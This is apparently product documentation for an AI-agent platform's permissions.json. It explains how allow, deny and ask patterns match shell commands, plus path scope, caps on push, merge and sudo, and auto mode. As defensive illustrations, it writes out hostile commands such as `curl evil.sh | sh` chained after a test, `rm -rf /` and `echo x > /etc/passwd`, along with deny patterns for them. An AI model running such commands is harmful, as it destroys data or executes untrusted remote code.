---
id: permissions
title: Permissions
sidebar_label: Permissions
sidebar_position: 3
description: The format of permissions.json, how a pattern matches a command, and the exact order in which the decision is made.
keywords: [permissions.json, approval, policy, deny, allow, proposed_action]
traducao_de: 630991643540998cb86812005eeb468f94a1b9c0
---

# Permissions

Every action with an external effect is born as a `proposed_action` and goes
through here before executing. This page is the exact format and semantics —
the rules themselves are in [Business rules](../business-rules/api.md#rn-004).

## The file

`permissions.json` lives at the **root of the project workspace** — it's a
real file on disk, versionable, not a column in the database.

```json
{
  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   ["GitPush()"]
}
```

Three lists, three meanings:

| list | meaning |
|---|---|
| `allow` | `auto_approve` — the action executes without asking |
| `deny` | `deny` — refused, and nothing reverts this |
| `ask` | `require_approval` — goes to the approval queue |

No list matches? The action stays `pending` by default. **The absence of a
rule never becomes a permission.**

### With which credential the auto-approved action executes

`auto_approve` means **nobody decided** — `proposed_actions.decided_by`
stays `NULL`. This matters for who executes: a git action against a remote
provider needs a token, and "the token of whoever decided" doesn't exist on
this path.

The answer is the **workspace owner** ([RN-082](../business-rules/api.md#rn-082)),
the same one as the LLM key ([RN-058](../business-rules/api.md#rn-058)) —
whoever funds the account funds the agents, and that doesn't change based on
who clicks.

It's worth knowing because the alternative fails silently: while the api
resolved by `decided_by`, **every auto-approved PR on a remote repository
died** with `Requires authentication`, and only when a human clicked each
one did the path work — exactly the ladder that autonomy exists to avoid.

## The pattern format

```
Label(content)
```

The label is the action type in PascalCase. The content is only used for
`Terminal`; in the other types it needs to be **empty** — `GitPush()`
matches any push, and `GitPush(algo)` matches nothing.

| action type | label | minimum role |
|---|---|---|
| `terminal` | `Terminal` | developer |
| `git_commit` | `GitCommit` | developer |
| `write_file` | `WriteFile` | developer |
| `git_push` | `GitPush` | maintainer |
| `pr_open` | `PrOpen` | maintainer |
| `git_repo_create` | `GitRepoCreate` | maintainer |
| `git_branch_create` | `GitBranchCreate` | maintainer |
| `git_branch_protect` | `GitBranchProtect` | maintainer |
| `open_adr_pr` | `OpenAdrPr` | maintainer |
| `open_infra_pr` | `OpenInfraPr` | maintainer |
| `git_merge` | `GitMerge` | maintainer |
| `instruction_patch` | `InstructionPatch` | maintainer |
| `parallelize` | `Parallelize` | maintainer |
| `raise_max_parallel` | `RaiseMaxParallel` | maintainer |
| `propose_execution_plan` | `ProposeExecutionPlan` | maintainer |
| `assess_implementability` | `AssessImplementability` | maintainer |
| `container_start` | `ContainerStart` | maintainer |
| `container_stop` | `ContainerStop` | maintainer |
| `container_remove` | `ContainerRemove` | maintainer |
| `spend` | `Spend` | **owner** |

The minimum role is checked **before** the file. Without it, `deny` —
`permissions.json` cannot grant what IAM denies

`parallelize` (Phase 14d) is the only one whose effect isn't touching code
or repository: it requests more AGENTS. It's at `maintainer` for the same
reason as `spend` — whoever authorizes cost is whoever is accountable for
the project. It only exists above the lead's cap; within it there's no
action, because there's nothing to decide
([RN-083](../business-rules/api.md#rn-083))
([RN-005](../business-rules/api.md#rn-005)).

`propose_execution_plan` (ADR 0086, [RN-284](../business-rules/engine.md#rn-284))
is the Dev Lead's plan — how many agents per module and why, before any of
them come up. Same caliber as `parallelize`: a decision about HOW MUCH the
product will spend on parallelism, just at the start instead of at a cap
overrun. Unlike `parallelize`/`raise_max_parallel`, it is NOT in the
absolute-caps block — it can be configured as `auto_approve`, like
`open_adr_pr`/`open_infra_pr` — and while it's `pending`, the Dev Lead's
turn stays SUSPENDED waiting for the decision, not just the conversation
stalled.

`assess_implementability` (ADR 0090, [RN-340](../business-rules/api.md#rn-340))
is the implementability assessment of a story (gate `implementavel`,
`docs/gates.yml`) — SAME caliber and SAME reasoning as
`propose_execution_plan`: an initial session decision, not a cap overrun,
and therefore also outside the absolute-caps block. It suspends the Dev
Lead's turn the same way while `pending`.

`container_stop` and `container_remove` (ADR 0136,
[RN-495](../business-rules/api.md#rn-495)) are the two actions the global
containers page (`/containers`) proposes when someone clicks "Stop" or
"Remove" on a project's row — always a human, never an agent. Both are
`maintainer`, same as `container_start`: whoever is accountable for the
project's infra decides. `container_stop` follows `container_start`'s
calibration — it CAN be configured `auto_approve` — except for the seed:
`container_stop` is never seeded, while `container_start` is seeded
`auto_approve` for the Infra agent when its handoff is accepted (ADR 0190,
[RN-671](../business-rules/api.md#rn-671)). That seed is what lets the start the
Infra Lead's SERVER proposes on that accept run without a second click; the
`maintainer` minimum, the mode/state refusals and the no-broker 409 all still
apply before it.
`container_remove` cannot: it discards the container and forces a full
reprovision, and is in the absolute-caps block below, same treatment as
external-effect git/privileged commands.

**None of the three cares WHERE the container comes up.** `decide()` and
every rule above are agnostic of `executionMode` — the branch only exists
in EXECUTION, after approval (`ExecuteContainerStartUseCase`/
`ExecuteContainerStopUseCase`/`ExecuteContainerRemoveUseCase`): a
`container` project's approved action still goes to the broker
(`ContainerBrokerPort`, unchanged); a `mounted`/`runner` project's goes to
the RUNNER connected to the project instead, over the Phoenix channel it
already keeps ([RN-497](../business-rules/produto.md#rn-497),
[ADR 0137](../adr/0137-o-runner-sobe-o-container-do-projeto.md)). "No
runner connected" and "the runner tried and refused" are both ordinary
`failed` outcomes, same discipline as a broker refusal — never an
uncaught exception.

**One more thing happens in `container_start` execution, and only for
`mounted`** ([RN-501](../business-rules/api.md#rn-501),
[ADR 0142](../adr/0142-validacao-de-workspace-montado-adiada.md)): the
project's folder is MATERIALIZED there. Creating a `mounted` project no
longer requires the folder to exist — creation validates only the path
format plus `BRABO_PROJECTS_BASE` — because the product owner's requirement
is that the bind-mount be created AFTER the architect's decision, and
`container_start` is the first moment that qualifies. So the executor
`mkdir -p`s the folder, proves it writable from inside the api, and stamps
`workspace_verified_at`, all BEFORE any lifecycle transition. A folder the
api cannot create or reach is a NAMED `failed` — it names the variable, the
path, the likely cause (folder ownership on the host; images run non-root,
ADR 0024) and the next step — and the lifecycle row is **not** marked
`provisioning`: marking it and only then finding out you cannot write would
leave `project_containers` asserting a state that never existed. None of
this touches `decide()`, the caps, or who may approve.

**And `container_start` resolves its resources there**
([RN-683](../business-rules/api.md#rn-683),
[ADR 0199](../adr/0199-recurso-minimo-derivado-do-module-map.md)): a field
the proposal OMITS — every field, in the server's start on handoff acceptance
— becomes the MINIMUM derived from the current `module_map` (the sum of what
each module declared, floored at today's default while any module declared
nothing); a field BELOW that minimum is a named `failed`, recorded before any
image decision or lifecycle transition; above it, the usual ceiling applies.
Like the folder materialization, this is execution, not policy: `decide()`
and who may approve do not change.

## How a pattern matches a command

Not by substring. The command is tokenized with shell rules and the pattern
matches by **token prefix**:

| pattern | command | matches? |
|---|---|---|
| `Terminal(pnpm test)` | `pnpm test` | ✅ |
| `Terminal(pnpm test)` | `pnpm test --watch` | ✅ (prefix) |
| `Terminal(pnpm test)` | `pnpm build` | ❌ |
| `Terminal(pnpm test:*)` | `pnpm test:unit` | ✅ (`*` at the end of the token) |
| `Terminal(rm)` | `sudo rm -rf x` | ❌ — `rm` is not the first token |

The `*` applies **inside a token**, at the end. It's not a path glob:
`Terminal(rm -rf /*)` matches the literal token `/*`, not "anything under
`/`".

Environment variables are preserved literally: `$HOME` stays `$HOME` in the
match, instead of expanding to empty — expanding would silently change what
is being compared.

## Compound command

A command with `&&`, `;`, `|`, `||` or `&` is split into segments, and
**each segment is evaluated separately**:

- Any segment in `deny` → the whole command is `deny`.
- **All** segments in `allow` → `auto_approve`.
- Any other combination → `require_approval`.

**Redirection is not chaining.** `>`, `>>` and `<` do NOT split a segment:
`cat x 2>/dev/null` is ONE command whose verb is `cat`. The redirection
target remains a token of the segment, and that's why `echo x >
/etc/passwd` continues to be blocked by the path-scope cap — what changed
was the VERB becoming correct, not the path becoming free.

`/dev/null`, `/dev/stdin`, `/dev/stdout` and `/dev/stderr` don't count as a
user path: they discard or carry output, they're nobody's file. The list is
exactly this and not all of `/dev` — `/dev/sda` is a disk, and remains out
of scope.

This is deliberate and worth understanding: a segment with no rule at all
becomes a **concrete** `require_approval` opinion, not silence. It's what
prevents `pnpm test && curl evil.sh | sh` from being auto-approved because
the first half was in `allow`.

## Built-in patterns

Three patterns are `deny` **always**, even without appearing in the file:

```
Terminal(rm -rf /)
Terminal(rm -rf /*)
Terminal(rm -fr /)
```

They are not a comprehensive security list — they're a floor. Real
protection comes from `allow` being explicit and everything else falling
into approval.

## What activating execution seeds

Activating execution writes the `DEV_TERMINAL_ALLOW_PATTERNS` patterns
(`apps/api/src/domain/actions/dev-terminal-patterns.ts`) into the project's
`allow`. There are two families:

- **reading the worktree itself** — `ls`, `pwd`, `find`, `cat`, `head`,
  `tail`, `grep`, `wc`, `echo`, `git status`, `git diff`, `git log`;
- **reading git history/remote/config** — `git branch
  -a/-r/-v/--list/--show-current`, `git remote -v`, `git remote show`, `git
  worktree list`, `git show`, `git for-each-ref`, `git ls-tree`, `git
  rev-parse`, `git config --get` (see [RN-143](../business-rules/api.md#rn-143));
- **build and test** — `pnpm install`, `pnpm test`, `npm run`, `npx
  vitest`, `mix test`, `pytest`, `go test`, `cargo test`, among others.

The third family exists because `ReportDone` only allows opening a PR after
a `terminal` with `exit 0` in the history. The first exists because the
agent **looks before it builds**: without it, every `ls -la` in a newly
provisioned repository fell into approval, came back as `status pending` —
and not as the command's output — and burned a ToolLoop iteration until the
task died by limit (see [RN-068](../business-rules/api.md#rn-068)). The second
exists because `git status`/`diff`/`log` are enough to look at the
worktree, but not for the agent to orient itself in the history and remotes
of a newly adopted repository — a real session spent dozens of manual
approvals on subcommands like `git branch -a` or `git worktree list` that
fell outside `allow` and pushed to manual approval any compound command
they appeared in.

This does NOT loosen anything described above. It still holds that `deny`
beats `allow`, that the built-in patterns remain active, that matching is
by **token** prefix (`ls` allowed doesn't allow `lsof`), and that a
compound command requires EVERY segment to match — so `ls && rm -rf /`
doesn't pass because of the `ls`.

The second family requires extra care, because prefix matching allows
ANYTHING after the prefix that matched: a bare pattern `Terminal(git
branch)` would match both `git branch -D nome` (deletes) and `git branch
nome-nova` (creates) as well as the plain listing, because it can't see
what comes after. That's why `branch`, `remote`, `worktree` and `config` —
the four that have a MUTATING sibling — only got in ANCHORED by the flag
that makes the read unambiguous (`-a`/`-v`/`show`/`list`/`--get`), never by
the bare verb; `git branch -D/-d/-m/-M`, `git remote add/remove/set-url`,
`git worktree add/remove/prune` and `git config <chave> <valor>` (without
`--get`) still require approval. `show`, `log`, `for-each-ref`, `ls-tree`
and `rev-parse` didn't need an anchor: none of their continuations mutate
the repository.

Auto-approving `terminal` via `agent_autonomy` would be different and is
not what's done: it would free up ANY command inside the engine container,
with no file in the middle.

## The complete decision order

```mermaid
flowchart TD
  A[proposed_action] --> B{role >= minimum?}
  B -->|no| D1[deny: insufficient IAM]
  B -->|yes| C0{terminal, and project's<br/>real container running?}
  C0 -->|yes| C1[base: auto_approve — RN-492/493]
  C0 -->|no| C[base: require_approval]
  C1 --> D{agent_autonomy has an opinion?}
  C --> D
  D -->|deny| D2[deny]
  D -->|other| E[adopts the opinion]
  D -->|none| E2[keeps the base]
  E --> F{permissions.json matches?}
  E2 --> F
  F -->|deny| D3[deny]
  F -->|allow/ask| G[adopts the file's verdict]
  F -->|none| G2[keeps the previous]
  G --> S{terminal touches path<br/>outside the project folder?}
  G2 --> S
  S -->|yes, and was auto_approve| I2[CAP: require_approval]
  S -->|no| Z{git_push/pr_open, or terminal requests<br/>git push, PR, deploy, or sudo/doas?}
  Z -->|yes, and was auto_approve| I3[CAP: require_approval — RN-418]
  Z -->|no| H{merge into protected branch<br/>or instruction_patch?}
  H -->|yes, and was auto_approve| I[CAP: require_approval]
  H -->|no| J[final verdict]
```

**Node `Z` changed position** ([RN-418](../business-rules/api.md#rn-418),
revises [RN-106](../business-rules/api.md#rn-106)): until the introduction of
the local runner, it sat right after IAM and returned `deny` — now it's a
CAP, in the same final block as the other three, applied after
`agent_autonomy` and `permissions.json` have already given their opinion.
See the section
["The boundary of external effect and privileged command"](#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418)
below for why.

### "Auto mode": the `agent_autonomy` wildcard ([RN-153](../business-rules/api.md#rn-153))

The `agent_autonomy has an opinion?` node in the diagram above doesn't
know, and doesn't need to know, whether the opinion came from a SPECIFIC
rule (`actionType: "terminal"`) or from the `actionType: "*"` wildcard —
"auto mode": autonomy for ANY type of action by that agent, turned on with
a click on "Automatic mode" in the `ApprovalCard`. The resolution happens
BEFORE this diagram begins, in a single repository:
`DrizzleAgentAutonomyRepository.findMode` looks up the specific rule and
the wildcard in the same query, and returns the specific one when both
exist — writing `terminal: deny` with `"*": auto_approve` turned on still
denies `terminal` for that agent, while freeing up the rest.

That's why the diagram didn't get a new node, and the caps, right below,
apply to "auto mode" because they react to `current.policy ===
'auto_approve'`, never to its origin
([RN-154](../business-rules/api.md#rn-154)).

**One exception, decided by the product owner: auto mode frees the path
scope** ([RN-603](../business-rules/api.md#rn-603),
[ADR 0167](../adr/0167-modo-automatico-libera-o-escopo-de-caminho.md)).
The repository also returns WHERE the autonomy came from
(`AgentAutonomyRepository.resolve`: `especifica` or `curinga`), and
`decide()` receives it as `ctx.autonomyOrigin`. When the wildcard resolves
to `auto_approve`, two approval requests go away: the [path-scope
cap](#path-scope) and the `require_approval` a compound command synthesises
for a segment with no rule at all. So an agent in auto mode runs any
terminal command, even outside the project folder — measured on `exp001`,
47 of 51 requests after auto mode was on came only from the scope, because
the dev agent runs inside the container (`/work`) and the scope compares
against the HOST root. Everything else stays: `deny` wins, an `ask` written
in the file asks, the external-effect/privileged cap (push, PR, deploy,
`sudo`/`doas`) runs first and ignores the origin, and protected-branch
merge, `instruction_patch`, parallelism and `container_remove` never
auto-approve. A SPECIFIC rule (`terminal: auto_approve` or
`terminal: require_approval`) is not auto mode and keeps the scope cap.

When a `git_merge` the human approved EXECUTES and the provider reports the PR
as `merged`, the task that PR came from moves to `done` — once: a repeated merge
of the same PR does not move it again or record a second
`backlog.task_status_changed` event ([RN-628](../business-rules/api.md#rn-628)). The
merge itself is never automated ([RN-418](../business-rules/api.md#rn-418)).

A `git_merge` is REFUSED before it is created when the same PR was already
merged by an earlier execution (409 `pr_ja_mergeado`) or already has a live
proposal — pending, approved or auto-approved (409 `merge_ja_proposto`); a
denied or failed one does not block trying again. Approving a pending merge
whose PR another proposal already merged is also 409 `pr_ja_mergeado`, and the
action stays `pending`. A QA/SecOps gate still pending is NOT a refusal: the
PRs tab and the chat only WARN, naming the gate, and the button stays enabled
([RN-663](../business-rules/api.md#rn-663)).

"Auto mode" requires `maintainer` — the same role that already protected
`PUT .../agent-autonomy` before the wildcard existed. Turning it off
reuses the manual/auto toggle the agent card already had in
Overview/Executors: with the wildcard written, the toggle switches to
editing IT instead of the usual representative type, and "manual" on it is
the same wildcard rewritten as `require_approval`.

### The container floor ([RN-492](../business-rules/engine.md#rn-492)/[RN-493](../business-rules/api.md#rn-493), [ADR 0134](../adr/0134-dev-agents-executam-dentro-do-container.md))

Node `C0` in the diagram above is new: when the action is `terminal` AND the
project has a container REGISTERED as `running` in `project_containers`
(`execution_mode: container` — checked by `ProposeActionUseCase`, which
already reads the same container lifecycle the execution side reads), the
BASE value stops being `require_approval` and starts as `auto_approve`.

This is a floor, not a new cap, and the distinction matters: every stage
that follows (`agent_autonomy`, `permissions.json`) already REPLACES the
base value when it has an explicit opinion — that's the same mechanism
that already let a `deny` rule or an `ask` pattern override the default
`require_approval` today. Starting from `auto_approve` instead of
`require_approval` doesn't change that property: an explicit `deny` or a
matching `ask` pattern still wins over the floor exactly like it already
won over the default. And the four caps below (`S`, `Z`, `H`, and the
compound-command rule) keep applying on top, unconditionally, whether the
`auto_approve` came from the floor or from an explicit rule — `git push`
inside a running container is still `require_approval`, same as always.

**Why this is safe: a second, stronger boundary, not the absence of one.**
Outside a container, the LEXICAL path scope below (`comandoNoEscopo`
against `projectScopeRoot`, a HOST path) is what makes auto-approving via
`permissions.json allow` safe. Inside the real container, the command
physically cannot see anything outside `/work` — Docker's mount namespace
— and the broker independently re-validates `cwd` is inside `/work`
before running anything (`DiretorioForaDoEscopoError`). **The lexical path
scope still runs on top of the floor, unchanged**: `cwd`/`command` reaching
`decide()` are never translated to `/work` (that translation happens later,
on the engine side, right before calling the broker), so a command that
would be flagged out-of-scope today is still flagged out-of-scope with the
floor on — it's redundant defense-in-depth, not a replacement.

## The boundary of external effect and privileged command (RN-418) {#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418}

**Revision of [ADR 0065](../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.md)
by [ADR 0102](../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.md)**
— a GLOBAL and explicit decision by the product owner, confirmed after an
automatic security warning about the change (the full history is in the
ADR). What follows describes the CURRENT behavior; the previous version
(unconditional `deny`, applied before any permissive stage) was replaced,
not loosened — see why right below.

`git push`, `git remote add`/`set-url`, `git merge`, the provider CLIs
(`gh pr create`, `gh pr merge`, `glab mr create`/`merge`, releases and
workflow dispatch), common deploy commands (`kubectl apply`, `helm
upgrade`, `terraform apply`, `docker push`, `npm publish`, ...) and now
also `sudo`/`doas` in a `terminal` command are an **ABSOLUTE CAP** (and,
since [RN-689](../business-rules/api.md#rn-689), so are the TYPED `git_push` and
`pr_open` actions, which until then the `"*"` wildcard, a specific rule or
`permissions.json` promoted to `auto_approve`) — in the
same final block as the other three caps (see ["Caps"](#caps) below),
applied after `agent_autonomy` and `permissions.json` have already given
their opinion: if the verdict up to that point was `auto_approve`, it
becomes unconditional `require_approval`. Neither the `"*"` wildcard for
"automatic mode" nor an `allow` entry in `permissions.json` can promote it
back.

**Why `require_approval` is now safe, when before it required `deny`.**
The historical reason for the `deny` was concrete: "always allow" writes
the pattern into `allow`, and a single click would be enough to reopen the
door forever. That gap was closed AT THE SOURCE, not worked around:
`ApproveAlwaysActionUseCase`/`patternsForAction`
(`apps/api/src/application/use-cases/actions/approve-always-action.use-case.ts`)
REFUSE to write a pattern into `allow` for a terminal action with git
external effect or a privileged command — the user still approves the
specific instance through the normal flow, but "always allow" never writes
the pattern for these two cases. Without this refusal, the cap would be
decorative.

`sudo`/`doas` got their own category in `external-effect.ts`
(`comandoPrivilegiadoNoComando`), matching by VERB in any segment — same
principle as `efeitoExternoNoComando` for git, which continues matching by
**token prefix**, ignoring global flags in the middle (`git -C /tmp push`
matches `git push`). Each segment of a compound command is checked: `pnpm
test && git push origin main` is blocked by the second segment, the same
way a compound command already requires every segment to match to become
`auto_approve`.

The cap doesn't take power away from the agent: for git, the error message
keeps pointing to which **typed** action to use — `git_push`, `git_merge`
or `pr_open` — which is born a `proposed_action`, follows the normal
pipeline, and records in the event log what was pushed and to where (it's
the path the dev agent already uses today, `agent_io.ex`). `sudo`/`doas`
don't have an equivalent typed action — the message just explains why that
command requires a human decision.

**Where this matters most now**: the
[local runner](../adr/0103-runner-local-execucao-na-maquina-do-usuario.md)
executes ALREADY approved commands on the user's own machine, with their
own privileges — it's exactly the scenario where a legitimate `sudo` (or
an attempt to escape via `sudo`) needs a human stop guaranteed by
construction, not by `permissions.json` convention.

**`container_remove` (ADR 0136, [RN-495](../business-rules/api.md#rn-495))
joins the same "always allow" refusal**, by a simpler mechanism than the
one above: it isn't a `terminal` command matched by token, it's its own
`actionType`, so `ApproveAlwaysActionUseCase` refuses the click outright
for that type — no pattern is ever written, and the user approves the
specific instance through the normal flow instead. `container_start` and
`container_stop` are NOT refused this way: they can be configured
`auto_approve`, same calibre as `open_adr_pr`/`open_infra_pr` —
`container_stop` is never seeded, and `container_start` is seeded for the
Infra agent on its handoff accept since ADR 0190.

**Order of an "always allow" click ([RN-642](../business-rules/api.md#rn-642)).**
The approval and the pattern are recorded in the SAME transaction: the
pattern (in `allow`, or in `agent_autonomy` for a module dev agent) and its
`permission.granted` event are written only after the transition out of
`pending` is valid, and a pattern that fails to write undoes the approval.
The `permissions.json` is a file and cannot join the transaction — the
residual window is the commit failing after the file was written, declared.
Clicking an action that already left `pending` by an APPROVAL (a double
click, the same pending action shown in two panels) is idempotent success,
`desfecho: "ja_aprovada"`, which records the pattern only if it is missing;
clicking a DENIED action is still `409` with `reason: "acao_ja_recusada"`
and writes nothing. The caps above are checked before any of this, even for
an action that was already approved.

**The TYPED half of the cap (AT-320).** Until 30/09 only the typed-in
`git push` command was refused; a typed `git_push` action went through and
wrote `GitPush()` into `allow`. "Always allow" now refuses, by type, the
single list `TIPOS_SEM_SEMPRE_PERMITIR`
(`apps/api/src/domain/actions/sempre-permitir.ts`): `git_push`, `pr_open`,
`git_merge`, `container_remove`, `instruction_patch`, `parallelize` and
`raise_max_parallel` — `400` with `reason: "teto_do_sempre_permitir"`. The
approval card hides the button for the same list (a copy checked against
this one by test). When it shipped, this did NOT change `decide()` nor what
activating execution seeds; since [RN-689](../business-rules/api.md#rn-689) both
changed: `git_push` and `pr_open` are inside the RN-418 cap in `decide()`
(see ["Caps"](#caps)), and activating execution seeds only `git_commit` as
`auto_approve` for each `dev-<module>`.

**The unit of the recorded pattern: verb + subcommand, one per segment
([RN-675](../business-rules/api.md#rn-675), owner decision 01/10).** "Always
allow" no longer records the whole command byte by byte: each segment of
the command (split on `&&`, `||`, `;`, `|`, `&`, as `decide()` splits it)
becomes one pattern — the verb plus its subcommand when the second token is
a word (`npm test`, `git status`, `mix test`, `npx vitest`), the verb alone
when it is an argument that is not a word (`cat src/x.ts` → `Terminal(cat)`,
`cd ../lib` → `Terminal(cd)`), and the EXACT segment when the second token is
a flag (`ls -la src`) or when the unit would be a prefix of an RN-418 cap
(`git remote -v`, `gh pr list` stay exact). A segment that is a cap prefix
even when exact (`git` alone) records nothing. `cd src/app && npm test`
records `Terminal(cd)` and `Terminal(npm test)`, and the next
`cd lib/core && npm test -- --coverage` runs without asking. Matching is
still by token prefix, the caps still run after the file in `decide()`, and
the path scope still applies outside auto mode. A module dev agent's click
still goes to `agent_autonomy`, not to a pattern ([RN-509](../business-rules/api.md#rn-509)).

## Path scope {#path-scope}

A `terminal` command is also evaluated by **where it touches**, not just
by the verb ([ADR 0055](../adr/0055-escopo-de-caminho-na-politica-de-terminal.md),
[RN-075](../business-rules/api.md#rn-075)). The project folder —
`<PROJECT_WORKSPACES_ROOT>/<workspace_dir_name>`, where `permissions.json`
and all agent worktrees live — is the **scope**. `workspace_dir_name`
([ADR 0066](../adr/0066-nome-de-pasta-legivel-do-workspace.md),
[RN-109](../business-rules/api.md#rn-109)) is the folder name frozen at
project creation — readable (`<slug>-<8 chars of the id>`) in a new
project, the plain UUID in a project from before that change.

**A project in `local` mode has a different scope, and the difference
matters here** ([ADR 0072](../adr/0072-projeto-local-ou-container.md),
[RN-169](../business-rules/api.md#rn-169)/[RN-170](../business-rules/api.md#rn-170)):
the root becomes the **absolute path the user typed at creation**, not
`join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)`.

Everything this section describes still holds — the scope tightens and
loosens exactly the same way, and `deny` still wins first. What changes is
what it CONTAINS. And the consequence is declared without softening in ADR
0072: the **structural** containment of the `join` — "the result never
leaves the managed root, whatever happens to the column" — ceases to exist
for these projects. What replaces it is the creation-time validation
(RN-170: absolute, no `..`, existing, writable, never a system root, never
overlapping the Brabo checkout), plus the LEXICAL revalidation of the same
predicate on every derivation of the root — so that a row tampered with
directly in the database doesn't turn into a terminal scope at `/`.

Path comparison is **lexical and without regex over the input**: trimming
trailing slashes is an O(n) scan, not `.replace(/\/+$/, '')`. The old
pattern was flagged by CodeQL as polynomial ReDoS (HIGH) — it forces the
engine to try every starting position, and degrades to O(n²) with many
slashes. The input here comes from an agent command, so it's not a place
for backtracking regex.

The scope does two opposite things, and it's the combination that matters:

**Tightens.** A command that touches a path from outside is never
auto-approved, no matter how much the verb is in `allow`. Without this, an
allowed `Terminal(cat)` would auto-execute `cat
/workspace/apps/engine/lib/engine/actions/git_executor.ex` — the platform
code that runs the agent — and reach into other projects' worktrees.

**Loosens.** Within the scope, `cd` stops being a verb that needs
permission: it's the scope declaration itself. Without this, the dev
agent, which always emits `cd <caminho> && <verbo>`, would run into the
compound-command rule — every segment needs to match — and **every**
command would stop for approval, no matter how much the verb was allowed.

Four limits worth understanding:

- **Scope permits, it doesn't exempt.** Being in the project folder
  doesn't make `curl … | sh` safe: a verb outside `allow` still requires
  approval.
- **Outside the scope is `require_approval`, not `deny`.** The agent may
  have a legitimate reason to look outside; who decides remains you.
- **Auto mode skips this cap.** An agent with the `"*": auto_approve`
  wildcard runs commands outside the scope without asking
  ([RN-603](../business-rules/api.md#rn-603)); turning the agent
  card back to "manual" restores it.
- **Normalization is lexical, not `realpath`.** `<raiz>/../..` is resolved
  and rejected; a symbolic link inside the project pointing outward is
  **not** detected. Scope is policy, not isolation.

Which tokens are checked: **absolute** ones (start with `/`) and ones that
contain `..`. A relative one without `..` resolves under the `cwd`, which
was already checked — and treating `-maxdepth`, `4`, or `*.ex` as a path
would reject a legitimate command without gaining any security.

Two properties that fall out of this:

**`deny` wins immediately.** No matter what stage it appears in, it
returns right away. There's no configuration that reverts a `deny`.

**A silent stage never downgrades.** If `agent_autonomy` said
`auto_approve` and `permissions.json` has no rule for that action, the
result stays `auto_approve` — the file doesn't "vote against" by
omission. Each stage can only raise the permissiveness of the previous
one.

## Caps {#caps}

Applied **last**, after everything else:

| cap | effect | why |
|---|---|---|
| `git_merge` with destination in `dev`, `qa`, `rc` or `main` | `auto_approve` → `require_approval` | merge into a protected branch is always your decision ([RN-006](../business-rules/api.md#rn-006)) |
| `instruction_patch` | `auto_approve` → `require_approval` | you need to see the diff before one agent changes another's behavior ([RN-007](../business-rules/api.md#rn-007)) |
| `parallelize` and `raise_max_parallel` | `auto_approve` → `require_approval` | spending on more agents is your decision; without this cap the lead's limit would be decorative, and raising the cap itself would be the product raising its own spending limit ([RN-086](../business-rules/api.md#rn-086)) |
| `terminal` with external-effect git (push/PR/deploy) or `sudo`/`doas` | `auto_approve` → `require_approval` | external-effect git and privileged commands are never auto-approvable, even with "automatic mode" on ([RN-418](../business-rules/api.md#rn-418), revises [RN-106](../business-rules/api.md#rn-106)) — see the dedicated section above |
| typed `git_push` and `pr_open` | `auto_approve` → `require_approval` | the same RN-418 cap through the typed door: neither the auto-mode wildcard, nor a specific `agent_autonomy` rule, nor `permissions.json` promotes them ([RN-689](../business-rules/api.md#rn-689)). `git_merge` keeps its own cap (first row); `deploy` is not a `proposed_action` type |
| `container_remove` | `auto_approve` → `require_approval` | discarding a container forces a full reprovision — the same caliber as merging into a protected branch, decided every time, never configured once ([RN-495](../business-rules/api.md#rn-495)) |

A cap downgrades `auto_approve` to `require_approval`; it does **not**
turn `deny` into something else, because `deny` would have already
returned earlier.

:::note Why `rc` is still on the list

The `rc` rung left the branch policy
([ADR 0030](../adr/0030-politica-de-branches-mecanizada.md)) and the
bootstrap stopped creating it ([RN-029](../business-rules/api.md#rn-029)) —
but it's still here, in `domain/actions/protected-branches.ts`.

This list decides what the merge lock **refuses**, and repositories
bootstrapped by earlier versions of Brabo still have the branch. Removing
it from here wouldn't remove anything from anyone's repository: it would
only make a `git_merge` with destination `rc` auto-approvable, on a branch
someone might be using as production.

Protecting a branch that doesn't exist costs nothing. Unprotecting one
that exists costs dearly — and the asymmetry is deliberate.

:::

The difference between a cap and a default: the default is what happens
when nobody configured anything; the cap is what happens **regardless** of
what was configured.

## What happens to the agent while the decision doesn't come

A `pending` action isn't just a row waiting for a click: on the other side
there's an agent stopped.

When the tool it called becomes pending, its loop **suspends**, holding on
to the task, the worktree, and the conversation history, and it enters
`awaiting_approval`. Your decision emits `task.action_settled`, which
wakes it up: the real result of the command takes the place where the
response would be, and the loop resumes from where it stopped.

**Refusing also responds.** The reason takes the place of the result, and
the agent learns that path is closed instead of waiting forever — denying
doesn't leave it stuck.

This matters for whoever operates: approving late doesn't waste the work
already done, and the approval queue isn't asynchronous for convenience —
it's literally what the agent is waiting for. Before this, `pending` came
back as if it were the command's response, and the agent burned its
iteration cap trying something else until the task died without a single
line written ([RN-073](../business-rules/engine.md#rn-073)).

**With one exception: engine restart.** The suspended loop lives in
memory, so a restart takes it down with it. In that case the task does
**not** stay waiting: it goes back to the blocked queue, with the reason
and origin `infra` in the event log, and a decision made after that has
nowhere left to be applied — the decided action stays recorded, but the
turn that was waiting for it no longer exists. If you approved and nothing
happened, this is the first place to look.

Auto-approval doesn't go through here: it executes at the proposal and the
result comes back in the same turn — which is exactly the value of having
the patterns from the previous section.

**The Dev Lead suspends the same way, with one difference on restart**
(ADR 0086, [RN-284](../business-rules/engine.md#rn-284)). It's conversational, it
has no worktree or task — what suspends is the turn's synchronous
`handle_call`, via `agent.status: awaiting_approval`. Unlike the dev
agent, it does NOT have a queue to return to on an engine restart: the
decision remains recorded and visible in Approvals, but the Dev Lead
doesn't narrate the outcome on its own — the process that was waiting
died, and the next restart brings up a new Dev Lead, with no subscription
for that action. An accepted and declared gap, not a disguised one.

## What gets written for each decision

Every proposed action and every decision about it become a **domain
event** in `session_events`, with the real actor
([RN-049](../business-rules/api.md#rn-049)):

| event | actor | when |
|---|---|---|
| `proposed_action.created` | the **agent** that proposed it | always, before any execution. `payload.status` says how the action was born: `pending`, `auto_approved`, or `denied`; `payload.reason` says which rule of `decide()` produced it ([RN-567](../business-rules/api.md#rn-567)) |
| `proposed_action.approved` | the **user** who clicked | only on manual approval (including `approve_always`) |
| `permission.granted` | the **user** who clicked "always allow" | only when the click actually recorded a pattern — `payload.patterns` (the patterns recorded, one per segment, [RN-675](../business-rules/api.md#rn-675)) and `payload.pattern` (the same list joined by ", "), or `payload.agentId`/`actionType` for a module dev agent ([RN-642](../business-rules/api.md#rn-642)) |
